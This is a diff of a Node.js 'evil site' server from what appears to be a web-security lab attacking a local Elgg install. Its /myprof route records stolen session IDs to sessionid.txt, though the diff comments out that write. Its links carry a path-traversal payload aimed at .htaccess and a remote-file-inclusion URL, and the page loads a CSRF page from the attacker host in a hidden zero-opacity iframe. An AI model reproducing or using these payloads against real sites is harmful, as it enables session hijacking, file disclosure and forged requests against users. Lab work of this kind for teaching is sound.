@@ -6,6 +6,9 @@ var http = require('http'),
     path = require('path'),
     qs = require('querystring'); 
 
+var evilsite = "localhost:1338";
+var elggsite = "localhost/elgg";
+
 //Count the number of visits to the page
 var countVisit = 0;
 
@@ -81,15 +84,15 @@ http.createServer(function (req, res) {
     	case "/myprof":    		
   			var getdata = qs.parse(urlObj.query);
             var log = fs.createWriteStream('sessionid.txt', {'flags': 'a'});    
-            log.write(new Date().getTime()+"::"+getdata.c+"~");
+         /*   log.write(new Date().getTime()+"::"+getdata.c+"~");
             var refUrl = url.parse(req.headers.referer);
             if(!refUrl){
-                var hostname = "localhost";
+                var hostname = elggsite;
             }else{
-                var hostname = refUrl.hostname;
-            }
+                var hostname = refUrl.hostname+"/elgg";
+            }*/
             
-    		res.writeHead(302,{Location: 'http://'+hostname+'/elgg/pg/profile/attack1'});
+    		res.writeHead(302,{Location: 'http://'+elggsite+'/pg/profile/attack1'});
     		res.end();
     		break;
 		case "/evilad":
@@ -273,7 +276,7 @@ function getHomePageHtmlCode(){
     str += '</a>';
 
 
-    str += '<a href="http://localhost/elgg/mod/ads/views/default/showlinks.php?file=../../../../.htaccess" class="mylink">';
+    str += '<a href="http://'+elggsite+'/mod/ads/views/default/showlinks.php?file=../../../../.htaccess" class="mylink">';
     str += '<div class="num">';
     str += '5';
     str += '</div>'; 
@@ -285,7 +288,7 @@ function getHomePageHtmlCode(){
     str += '</div>';
     str += '</a>';
 
-    str += '<a href="http://localhost/elgg/mod/ads/views/default/showlinks.php?file=http://code.jquery.com/jquery-1.11.0.min.js" class="mylink">';
+    str += '<a href="http://'+elggsite+'/mod/ads/views/default/showlinks.php?file=http://code.jquery.com/jquery-1.11.0.min.js" class="mylink">';
     str += '<div class="num">';
     str += '6';
     str += '</div>'; 
@@ -418,7 +421,7 @@ str += '<font color="white"><h1>Welcome to this Web Security Site !!!</h1>';
 str += '<h2>There is a surprise for you every 5 seconds</h2></font>';
 str += '</center>';
 
-str += '<iframe src="http://localhost:1338/csrfwithtok.html" style="position: relative;opacity: 0;"></iframe>';
+str += '<iframe src="http://'+evilsite+'/csrfwithtok.html" style="position: relative;opacity: 0;"></iframe>';
 str += '</body>';
 str += '</html>';
 
